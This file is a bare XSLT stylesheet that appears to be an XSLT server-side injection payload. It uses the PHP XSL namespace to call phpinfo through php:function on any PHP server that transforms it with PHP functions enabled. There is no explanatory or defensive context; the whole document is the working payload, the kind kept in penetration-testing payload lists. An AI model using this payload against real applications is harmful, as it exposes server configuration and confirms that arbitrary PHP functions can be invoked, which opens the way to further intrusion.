<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
  <xsl:value-of select="php:function('phpinfo',1)"/>
  </xsl:template>
</xsl:stylesheet>
